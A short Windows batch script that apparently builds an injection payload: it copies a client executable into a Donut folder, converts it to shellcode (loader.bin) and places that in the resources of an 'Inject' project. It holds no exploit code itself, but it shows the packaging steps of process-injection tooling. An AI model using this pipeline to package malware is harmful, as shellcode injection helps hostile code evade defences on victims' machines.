@echo off
copy payload\myclient.exe external\donut\target.exe
cd external\donut
call toshellcode.bat
cd ..\..
copy external\donut\loader.bin external\Inject\Resources\loader.bin
